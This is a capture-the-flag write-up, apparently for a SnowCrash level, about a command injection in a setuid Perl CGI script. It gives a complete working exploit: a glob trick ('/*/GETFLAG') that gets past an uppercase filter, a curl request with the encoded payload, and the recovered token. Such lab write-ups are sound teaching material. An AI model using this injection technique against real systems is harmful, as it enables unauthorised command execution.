# level12

Target is `flag12`. Let's check what we can work with:

```sh
ls -lA
```

Files:

```
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

We have a single Perl script. Let's see what it does.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

It's a CGI server that processes HTTP query parameters `x` and `y`. Let's rewrite functions `n` and `t` because they are quite unreadable.

```perl
sub t ($xx, $nn) {
  $xx =~ tr/a-z/A-Z/; # do translation: lowercase -> UPPERCASE
  $xx =~ s/\s.*//; # remove anything past a whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`;

  foreach $line (@output) {
      ($first, $second) = split(/:/, $line);
      if($second =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n ($n) {
    if ($n == 1) {
        print "..";
    } else {
        print ".";
    }
}
```

That's better. We will perform our exploit where the script invokes a shell because it does not quote the parameters properly.
The transformation of `$xx` can be obstacle though. We cannot simply do `?x=getflag%3E%2Ftmp%2Fflag` (`?x=getflag>/tmp/flag` URL-encoded) or the like because any ASCII lowercase character will be transformed to uppercase. We could use a script `/tmp/GETFLAG` but the problem would remain: `/tmp` will be transformed to `/TMP`. We need to be able to access some entry in the filesystem _without_ using letters. Fortunately, a POSIX shell can expand a wildcard `*` to a matching entry in the filesystem. Using `/*/GETFLAG` should do the trick, if a file named `GETFLAG` exists in any directory at the root of the filesystem.

By messing around with a dummy Perl script, here is a value of `$xx` that could be used to exploit the request handler.

```sh
$xx='"</;/*/GETFLAG;"';

$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;

print "egrep \"^$xx\" /tmp/xd 2>&1";
```

Output:

```sh
egrep "^"</;/*/GETFLAG;"" /tmp/xd 2>&1
```

Prettified:

```sh
egrep "^" </
/*/GETFLAG
"" /tmp/xd 2>&1
```

The first and last command will fail. It does not really matter, because it will execute the `/tmp/GETFLAG` script, which is where all our logic will take place, transformation-free.

```sh
echo 'getflag >/tmp/flag' >/tmp/GETFLAG && chmod +x /tmp/GETFLAG
curl -fsS http://localhost:4646?x='%22%3C%2F%3B%2F*%2FGETFLAG%3B%22'
cat /tmp/flag
```

Output:

```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Let's try the password:

```
level13@localhost's password: g1qKMiRpXf53AWhDaU7FEkczr
```

Noice.
